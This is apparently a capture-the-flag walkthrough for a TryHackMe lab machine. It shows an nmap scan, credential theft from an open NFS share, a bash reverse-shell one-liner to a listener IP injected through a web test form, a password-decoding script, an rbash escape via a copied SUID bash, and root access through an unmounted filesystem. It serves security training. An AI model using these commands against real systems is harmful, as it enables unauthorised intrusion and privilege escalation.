# NMAP

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbRN8GvRSpA+ku5hqrPnyaobOvwYc4jddRGBHo91dNlIjNdX4LIRLCLdJkpMlW64MVwHV8QIjTFNxPqLQvOkbIn3yX+MQByFziSNf7h5+/tqrXDwZDMMqFAmZ7yeXoopcRY1cfumkYUHbjRxdrNj8Hpd8ol6xnIo9y+qiZx1HPpY3P9HsRpZ6XBq0bE3J68gBozFQmXa8gIU5aX+l0PHOdctWRo4vXa/oQteObsn9Rx+69WpatoDx1TdP4T3fGa3f1dMFIohCzlTUPJgzyGuRZq6JjaBvItUIGPg+isvkg7+diSLDCIo/U7vixeJNLrnvETMnRlwn0jOKxUFrtIwB7
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz3AD3vWNpd2P1sXPm9tHrr6RQjBiCsXT0U/6euW2oK1RqQvipuiKTlcpNRRsXOxcIpscn+7M3nwW5Cgq0ipiA=
|   256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAv5Jlh5/zgLa5D73WCXKa44htAWA67kUp4x5pGWgXri
111/tcp  open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34692/udp   mountd
|   100005  1,2,3      52127/tcp6  mountd
|   100005  1,2,3      55133/tcp   mountd
|   100005  1,2,3      57913/udp6  mountd
|   100021  1,3,4      35433/udp   nlockmgr
|   100021  1,3,4      42963/tcp6  nlockmgr
|   100021  1,3,4      44887/tcp   nlockmgr
|   100021  1,3,4      51174/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl syn-ack 3 (RPC #100227)
8080/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Showmount

```bash
$ showmount -e $IP
Export list for 10.10.182.84:
/var/nfs/general *
```


```bash
mkdir /tmp/nfs
sudo mount -o rw ip:/var/nfs/general /tmp/nfs
cd /tmp/nfs && ls -la

```

## Found Credential.bak in it

```bash
p*************t
S************9
```

# Logged on /login

![Pasted image 20210416055105](https://user-images.githubusercontent.com/68326057/115082998-652cb580-9f24-11eb-8a85-57e7a43a4c33.png)


## Test-1

```bash
sleep 5 
PASSED
```

## TEST-2

```bash
bash -c 'bash -i >& /dev/tcp/10.9.53.25/8080 0>&1'
Got shell
```

**paradox@cchq:~$**

# paradox

## Users
```bash
root:x:0:0:root:/root:/bin/bash
tux:x:1000:1000:tux:/home/tux:/bin/bash
szymex:x:1001:1001::/home/szymex:/bin/bash
varg:x:1002:1002::/home/varg:/bin/bash
paradox:x:1003:1003::/home/paradox:/bin/bash

```

## suid set on this programme

```bash
/home/varg/CooctOS.py
```

## Crontab

![Pasted image 20210416055855](https://user-images.githubusercontent.com/68326057/115085463-357fac80-9f28-11eb-8a15-a6ea7b398648.png)

# szymex
## SniffingCat.py

```python
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
```

## Decoding It

## TEST-1
```python

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

string="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

encstr=encode(string)
print("[!] ",encstr)
print("\n\n",len(string),len(encstr))
enc_pass="pureelpbxr"

count=0
new=''
for char in enc_pass:
	print("[+]Testing Char -->"+char)
	for enc_char in encstr:
		if enc_char == char:
			print("[+] Found "+char+" is replaced by "+string[count] )
			new+=string[count]
		count=count+1
	count=0
```

![Pasted image 20210417070838](https://user-images.githubusercontent.com/68326057/115083045-7249a480-9f24-11eb-9c45-bc15b2addcc8.png)

1. We can see few char are repeating in it .
2. So we have to take cases[8], make all possible password.
3. Put back in the encoded function if they match we got the pas.

```bash
case=["cherrycoke","cherrycUke","cherXycoke","cherXycUke","cheXrycoke","cheXrycUke","cheXXycoke","cheXXycUke"]
```


# szymex


![Pasted image 20210416065942](https://user-images.githubusercontent.com/68326057/115082997-64941f00-9f24-11eb-87d4-51e30b9d762a.png)

we are in testers group

![Pasted image 20210416070007](https://user-images.githubusercontent.com/68326057/115082906-43cbc980-9f24-11eb-905f-9ca550c24c7e.png)

## Tuxling_1

## modified nootcode.c

```c

#include <stdio.h>

int main (){
    printf ( "What does the penguin say?") ;
    nuut() ;
    // I added this coded before return 0
    printf("\n\n key:- \t");
    key();
    printf("\n\n");
    return 0 ;
}

void key() {
    printf("f96" "050a" "d61");
}

void nuut (){
    printf("NOOT!") ;
}
```

## Tuxling_2

![Pasted image 20210416073101](https://user-images.githubusercontent.com/68326057/115082909-44646000-9f24-11eb-81c6-e5f729c98b34.png)



![Pasted image 20210416080927](https://user-images.githubusercontent.com/68326057/115082789-141cc180-9f24-11eb-8fac-5d9589079aa1.png)

```bash
6********d
```

## Tuxling_3

```bash
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

##
1. Now I have to combine them.
2. f96050**********7b56db1552
3. This looks like a hash
4. Decode it in CrackStation

# Tux
```bash
t********y -->password
```

![Pasted image 20210416082125](https://user-images.githubusercontent.com/68326057/115082782-1252fe00-9f24-11eb-919c-aa84f0a2fae6.png)


## Git Log

![Pasted image 20210416082432](https://user-images.githubusercontent.com/68326057/115082994-6362f200-9f24-11eb-8a6a-f79527168adc.png)



```bash
git checkout 6919df5c171460507f69769bc20e19bd0838b74d
```

# in  bin folder

```python


#!/usr/bin/python3

import time
import os;
import pty;

#print(chr(27)+ "[2J")
logo = """\033[1;30;49m
 ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝\033[1;37;49m██╔═══██╗██╔════╝\033[1;30;49m
██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
 ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
"""
print(logo)
print("                       LOADING")
print("[", end='')

for i in range(0,60):
    #print(chr(27)+ "[2J")
    #print(logo)
    #print("                       LOADING")
    print("[", end='')
    print("=" * i, end='')
    print("]")
    time.sleep(0.02)
    print("\033[A\033[A")

print("\032")
print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")

print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")

print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")

print("CooctOS 13.3.7 LTS cookie tty1")
uname = input("\ncookie login: ")
pw = input("Password: ")

for i in range(0,2):
    if pw != "s************k":
        pw = input("Password: ")
    else:
        if uname == "varg":
            os.setuid(1002)
            os.setgid(1002)
            pty.spawn("/bin/rbash")
            break
        else:
            print("Login Failed")
            break
```

# varg
1. It will spawn rbash
2. type:- cp /bin/bash .
3. on second terminal login again as tux
4. then type :- /home/varg/cooctOS_src/bin/bash -p

![Pasted image 20210416091706](https://user-images.githubusercontent.com/68326057/115082913-45958d00-9f24-11eb-815d-4f6a35381dd1.png)


# OR
--> use The above pass to directly become varg

![Pasted image 20210416092448](https://user-images.githubusercontent.com/68326057/115082779-1121d100-9f24-11eb-891a-d3475ad5a5c6.png)

# root
```bash
type : sudo umount -f /opt/CooctFS
```

1. There will we /root dir in /opt/CooctFS (Note:- The Root Dir was already present in it.)
2. grab the id_rsa in .ssh folder
3. become root grab the flag and paste it on THM

![Pasted image 20210416104512](https://user-images.githubusercontent.com/68326057/115082776-0ff0a400-9f24-11eb-8173-e22faf7e196b.png)
